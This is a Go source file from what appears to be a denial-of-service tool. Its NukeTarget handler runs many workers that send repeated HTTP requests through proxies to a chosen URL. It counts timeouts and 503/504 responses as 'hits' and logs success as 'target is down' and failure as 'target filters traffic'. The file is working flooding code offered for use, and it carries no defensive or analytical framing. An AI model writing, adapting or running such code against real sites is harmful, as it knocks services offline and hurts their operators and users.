package handler

import (
	"bytes"
	"context"
	"io"
	"log"
	"net/http"
	"os"
	"syscall"

	logw "github.com/andriiyaremenko/logwriter"
	"github.com/andriiyaremenko/logwriter/color"
	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/dto"
	"github.com/andriiyaremenko/pipelines"
	"github.com/pkg/errors"
)

func NukeTarget(
	log *log.Logger,
	agentUID string,
	numWorkers int,
	amountRequests int64,
) pipelines.Handler[dto.Target, dto.TargetResponse] {
	return &pipelines.BaseHandler[dto.Target, dto.TargetResponse]{
		NWorkers: numWorkers,
		HandleFunc: func(ctx context.Context, w pipelines.EventWriter[dto.TargetResponse], e pipelines.Event[dto.Target]) {
			select {
			case <-ctx.Done():
				return
			default:
			}

			target := e.Payload

			client, err := client.WithProxy(target.Proxy)
			if err != nil {
				w.Write(pipelines.NewErr[dto.TargetResponse](
					errors.Wrapf(err, "bad target proxy record: %s", target.Proxy),
				))
				return
			}

			hits := 0
			for i := amountRequests; i > 0; i-- {
				select {
				case <-ctx.Done():
					return
				default:
				}

				resp, err := sendRequest(client, &target)
				targetResp := dto.TargetResponse{Target: target}

				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
					hits++

					log.Println(
						logw.Debug.
							WithString("target", target.URL).
							WithString("error", err.Error()),
						color.ColorizeText(color.ANSIColorGreen, "target is down"),
					)
					w.Write(pipelines.NewErrEvent(targetResp, errors.Wrap(err, "target is down")))

					if hits >= 5 {
						return
					}

					continue
				}

				if errors.Is(err, io.EOF) ||
					errors.Is(err, syscall.ECONNRESET) ||
					errors.Is(err, syscall.ECONNREFUSED) {
					log.Println(
						logw.Debug.
							WithString("target", target.URL).
							WithString("error", err.Error()),
						color.ColorizeText(color.ANSIColorYellow, "attack failed, target filters traffic"),
					)
					w.Write(pipelines.NewErrEvent(targetResp, errors.Wrap(err, "target filters traffic")))

					return
				}

				if err != nil {
					log.Println(
						logw.Debug.
							WithString("target", target.URL).
							WithString("error", err.Error()),
						color.ColorizeText(color.ANSIColorRed, "failed request"),
					)
					w.Write(pipelines.NewErrEvent(targetResp, errors.Wrap(err, "request failed")))

					continue
				}

				resp.Body.Close()

				targetResp.Code = resp.StatusCode

				w.Write(pipelines.Event[dto.TargetResponse]{Payload: targetResp})

				if resp.StatusCode == http.StatusServiceUnavailable ||
					resp.StatusCode == http.StatusGatewayTimeout {
					hits++

					log.Println(
						logw.Debug.WithString("target", target.URL),
						color.ColorizeText(color.ANSIColorRed, "target is down"),
					)

					if hits >= 5 {
						return
					}

					continue
				}

				hits = 0
			}
		},
	}
}

func sendRequest(client *http.Client, target *dto.Target) (*http.Response, error) {
	var body io.Reader = nil

	if target.Data != nil {
		body = bytes.NewReader(target.Data)
	}

	req, err := http.NewRequest(target.Method, target.URL, body)
	if err != nil {
		return nil, err
	}

	for _, header := range target.Headers {
		req.Header.Add(header[0], header[1])
	}

	return client.Do(req)
}
